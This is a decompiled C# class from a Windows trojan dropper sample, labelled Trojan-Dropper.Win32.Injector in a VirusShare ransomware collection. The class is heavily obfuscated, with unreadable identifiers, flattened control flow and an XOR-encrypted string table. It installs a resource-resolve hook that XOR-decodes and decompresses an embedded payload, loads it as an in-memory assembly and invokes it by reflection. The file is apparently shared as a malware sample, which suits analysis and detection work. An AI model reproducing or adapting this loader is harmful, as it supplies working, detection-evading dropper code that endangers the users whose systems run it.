// Decompiled with JetBrains decompiler
// Type: Ⴀ.Ⴗ
// Assembly: Adăugaţi, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: 94898473-1698-43EF-802C-435AE13CAFBB
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan-Dropper.Win32.Injector.dywn-126e0a8467d20fd674b822d1a90f6bc3693d7ccc8c7a25027c689e975705c0e2.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Policy;

namespace Ⴀ
{
  internal sealed class Ⴗ
  {
    private static bool Ⴍ;
    private static readonly char[] Ⴃ;
    private static readonly char[] Ⴐ = new char[8]
    {
      char.MinValue,
      '\u0005',
      char.MinValue,
      'ł',
      'Ⓒ',
      'ඔ',
      '♪',
      '㴮'
    };
    private static readonly string[] Ⴅ;
    internal static Ⴀ.Ⴗ.Ⴀ Ⴜ;

    private static void Ⴈ() => Ⴀ.Ⴅ.Ⴜ(Ⴀ.Ⴅ.Ⴃ.Ⴐ(Ⴀ.Ⴅ.Ⴗ(901, 991), Ⴀ.Ⴗ.Ⴈ.Ⴐ.Ⴄ(Ⴀ.Ⴅ.Ⴃ.Ⴈ(1423885450, 8), 914, 1004), 106, 104), Ⴀ.Ⴅ.Ⴃ.Ⴈ(1423862913, 0), 634, 629).GetMethod(Ⴀ.Ⴅ.Ⴃ.Ⴈ(1423862941, 5)).Invoke((object) null, (object[]) null);

    private static void Ⴓ()
    {
      Ⴀ.Ⴗ.Ⴄ();
      Ⴀ.Ⴗ.Ⴈ();
    }

    static Ⴗ()
    {
      char[] chArray = new char[8]
      {
        char.MinValue,
        char.MinValue,
        'ඥ',
        char.MinValue,
        char.MinValue,
        char.MinValue,
        'ʾ',
        char.MinValue
      };
      chArray[1] = '\u248D';
      chArray[5] = '\u2E59';
      chArray[7] = 'ᾐ';
      chArray[3] = '♓';
      chArray[4] = '㵬';
      chArray[0] = 'ů';
      Ⴀ.Ⴗ.Ⴅ = new string[1];
      Ⴀ.Ⴗ.Ⴃ = chArray;
      Ⴀ.Ⴗ.Ⴄ();
    }

    internal static void Ⴄ()
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 2:
            goto label_4;
          default:
            if (!Ⴀ.Ⴗ.Ⴍ)
            {
              num1 = 2;
              continue;
            }
            goto label_11;
        }
      }
label_11:
      return;
label_4:
      lock (typeof (Ⴀ.Ⴗ))
      {
        int num2 = 2;
        while (true)
        {
          switch (num2)
          {
            case 0:
              AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(Ⴀ.Ⴗ.Ⴈ.Ⴐ.Ⴅ);
              goto case 1;
            case 1:
            case 3:
              num2 = 5;
              continue;
            case 4:
              Ⴀ.Ⴗ.Ⴍ = true;
              goto case 0;
            case 5:
              goto label_13;
            default:
              num2 = Ⴀ.Ⴗ.Ⴍ ? 5 : 4;
              continue;
          }
        }
      }
label_13:
      int num3 = 3;
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 1:
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴀ.Ⴗ.Ⴄ);
            num3 = 5;
            continue;
          case 4:
            goto label_17;
          case 5:
            goto label_18;
          default:
            num3 = 5;
            continue;
        }
      }
label_17:
      return;
label_18:;
    }

    internal static string Ⴗ([In] int obj0, [In] int obj1)
    {
      int index1 = obj0 ^ 1423885442 ^ obj1;
      char[] ⴐ = Ⴀ.Ⴗ.Ⴐ;
      int index2 = (int) ⴐ[index1];
      string str1;
      if ((str1 = Ⴀ.Ⴗ.Ⴅ[index2]) != null)
        return str1;
      int num1 = (int) ⴐ[index1 + 1];
      int length1 = ((int) ⴐ[index1 + 2] << 16) + num1;
      char[] chArray = new char[length1];
      char[] ⴃ = Ⴀ.Ⴗ.Ⴃ;
      int length2 = ⴃ.Length;
      int num2 = index1 + 3;
      for (int index3 = 0; index3 < length1; index3 = 1 + index3)
        chArray[index3] = (char) ((uint) ⴐ[num2 + index3] ^ (uint) ⴃ[(index3 + index2) % length2]);
      string str2 = new string(chArray);
      Ⴀ.Ⴗ.Ⴅ[index2] = str2;
      return str2;
    }

    internal static Assembly ႤႭ([In] int obj0, [In] int obj1)
    {
label_0:
      switch ((obj1 ^ obj0) - 24)
      {
        case 0:
          return Assembly.GetExecutingAssembly();
        default:
          goto label_0;
      }
    }

    internal static void ႤႤ([In] Array obj0, [In] RuntimeFieldHandle obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      switch ((obj3 ^ obj2) - 15)
      {
        case 0:
          RuntimeHelpers.InitializeArray(obj0, obj1);
          break;
        default:
          goto label_0;
      }
    }

    internal static void ႤႷ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_0:
      switch ((obj5 ^ obj4) - 73)
      {
        case 0:
          obj0.Write(obj1, obj2, obj3);
          break;
        default:
          goto label_0;
      }
    }

    internal sealed class Ⴈ
    {
      internal static bool Ⴗ([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 69:
            num1 = 6;
            break;
          default:
            num1 = 0;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              num2 = 1;
              continue;
            case 1:
              goto label_3;
            case 2:
            case 6:
              goto label_8;
            case 4:
            case 7:
              num2 = 1;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴀ.Ⴗ.Ⴈ.Ⴗ);
              num2 = 1;
              continue;
          }
        }
label_8:
        return object.ReferenceEquals(obj0, obj1);
      }

      internal sealed class Ⴐ
      {
        internal static Ⴀ.Ⴗ.Ⴈ.Ⴐ.Ⴐ Ⴍ;

        internal static Assembly Ⴅ([In] object obj0, [In] ResolveEventArgs obj1) => Ⴀ.Ⴗ.Ⴈ.Ⴐ.Ⴃ(obj1, __fieldref (Ⴀ.Ⴗ.Ⴈ.Ⴐ.Ⴍ), 581, "fc3d7977-08e6-418e-a229-ac3ce6a163f3", 254);

        internal static Assembly Ⴃ(
          ResolveEventArgs args,
          RuntimeFieldHandle resourceField,
          int resourceLength,
          string nameGuid,
          int offset)
        {
label_3:
          while (resourceLength > 0)
          {
            int num1 = 9;
            Assembly assembly1;
            string name;
            AppDomain appDomain;
            Dictionary<string, string> dictionary;
            byte[] buffer;
            int index1;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  Ⴀ.Ⴗ.ႤႤ((Array) buffer, resourceField, 811, 804);
                  index1 = 0;
                  num1 = 13;
                  continue;
                case 2:
                case 5:
                  goto label_15;
                case 3:
                  buffer[index1] ^= (byte) (index1 + offset & (int) byte.MaxValue);
                  num1 = 8;
                  continue;
                case 4:
                case 11:
                  goto label_3;
                case 6:
                  buffer = new byte[resourceLength];
                  num1 = 0;
                  continue;
                case 7:
                  dictionary = new Dictionary<string, string>();
                  Ⴀ.Ⴅ.Ⴃ.Ⴃ(appDomain, nameGuid, (object) dictionary, 279, 262);
                  goto case 6;
                case 8:
                  ++index1;
                  num1 = 13;
                  continue;
                case 9:
                  assembly1 = Ⴀ.Ⴗ.ႤႭ(666, 642);
                  name = Ⴀ.Ⴗ.Ⴈ.Ⴐ.Ⴓ(nameGuid, Ⴀ.Ⴗ.Ⴗ(1423885443, 1), 628, 548);
                  num1 = 10;
                  continue;
                case 10:
                  appDomain = Ⴀ.Ⴅ.ႰႤ(690, 685);
                  dictionary = (Dictionary<string, string>) Ⴀ.Ⴅ.ႰႰ(appDomain, nameGuid, 977, 909);
                  num1 = 12;
                  continue;
                case 12:
                  if (dictionary == null)
                  {
                    num1 = 7;
                    continue;
                  }
                  goto label_35;
                case 13:
                  num1 = index1 < resourceLength ? 3 : 5;
                  continue;
                default:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴀ.Ⴗ.Ⴈ.Ⴐ.Ⴃ);
                  num1 = 4;
                  continue;
              }
            }
label_15:
            MemoryStream memoryStream = new MemoryStream();
            DeflateStream deflateStream = new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress, true);
            try
            {
              int num2 = 6;
              byte[] numArray;
              int num3;
              while (true)
              {
                switch (num2)
                {
                  case 0:
                  case 7:
                    Ⴀ.Ⴗ.ႤႷ((Stream) memoryStream, numArray, 0, num3, 846, 775);
                    goto case 1;
                  case 1:
                  case 3:
                  case 4:
                    num2 = (num3 = Ⴀ.Ⴅ.ႰႷ((Stream) deflateStream, numArray, 0, numArray.Length, 22, 3)) > 0 ? 0 : 2;
                    continue;
                  case 2:
                    goto label_26;
                  default:
                    numArray = new byte[1024];
                    num2 = 3;
                    continue;
                }
              }
            }
            finally
            {
              int num4 = 0;
              while (true)
              {
                switch (num4)
                {
                  case 1:
                  case 4:
                    goto label_25;
                  case 5:
                    goto label_24;
                  default:
                    num4 = deflateStream == null ? 4 : 5;
                    continue;
                }
              }
label_24:
              deflateStream.Dispose();
label_25:;
            }
label_26:
            int num5 = 4;
label_27:
            Assembly assembly2;
            string[] strArray;
            int index2;
            while (true)
            {
              switch (num5)
              {
                case 0:
                  num5 = index2 < strArray.Length ? 9 : 7;
                  continue;
                case 1:
                  goto label_37;
                case 2:
                  goto label_38;
                case 3:
                  num5 = !dictionary.ContainsKey(args.Name) ? 2 : 1;
                  continue;
                case 5:
                case 6:
                  Ⴀ.Ⴅ.Ⴃ.Ⴃ(appDomain, name, (object) assembly2, 726, 708);
                  strArray = Ⴀ.Ⴅ.Ⴃ.Ⴜ(assembly2, 712, 760);
                  num5 = 11;
                  continue;
                case 7:
                  num5 = 3;
                  continue;
                case 9:
                  string key = strArray[index2];
                  dictionary[key] = key;
                  goto case 13;
                case 10:
                  goto label_35;
                case 11:
                  index2 = 0;
                  num5 = 0;
                  continue;
                case 13:
                  ++index2;
                  num5 = 0;
                  continue;
                default:
                  assembly2 = Ⴀ.Ⴗ.Ⴈ.Ⴐ.Ⴗ(Ⴀ.Ⴗ.Ⴈ.Ⴐ.Ⴀ(memoryStream, 706, 728), (byte[]) null, Ⴀ.Ⴅ.ႰႳ(assembly1, 881, 873), 663, 767);
                  num5 = 6;
                  continue;
              }
            }
label_37:
            return assembly2;
label_35:
            assembly2 = (Assembly) appDomain.GetData(name);
            num5 = 3;
            goto label_27;
          }
label_38:
          return (Assembly) null;
        }

        internal static byte[] Ⴄ([In] string obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 126:
              num1 = 1;
              break;
            default:
              num1 = 2;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 6:
                num2 = 4;
                continue;
              case 1:
                goto label_8;
              case 2:
              case 5:
                num2 = 4;
                continue;
              case 4:
                goto label_3;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴀ.Ⴗ.Ⴈ.Ⴐ.Ⴄ);
                num2 = 4;
                continue;
            }
          }
label_8:
          return Convert.FromBase64String(obj0);
        }

        internal static string Ⴓ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
        {
label_0:
          switch ((obj3 ^ obj2) - 80)
          {
            case 0:
              return obj0 + obj1;
            default:
              goto label_0;
          }
        }

        internal static byte[] Ⴀ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
        {
label_0:
          switch ((obj2 ^ obj1) - 26)
          {
            case 0:
              return obj0.ToArray();
            default:
              goto label_0;
          }
        }

        internal static Assembly Ⴗ(
          [In] byte[] obj0,
          [In] byte[] obj1,
          [In] Evidence obj2,
          [In] int obj3,
          [In] int obj4)
        {
label_0:
          switch ((obj4 ^ obj3) - 104)
          {
            case 0:
              return Assembly.Load(obj0, obj1, obj2);
            default:
              goto label_0;
          }
        }

        [StructLayout(LayoutKind.Explicit, Size = 581, Pack = 1)]
        private struct Ⴐ
        {
        }
      }
    }

    [StructLayout(LayoutKind.Explicit, Size = 16, Pack = 1)]
    private struct Ⴀ
    {
    }
  }
}
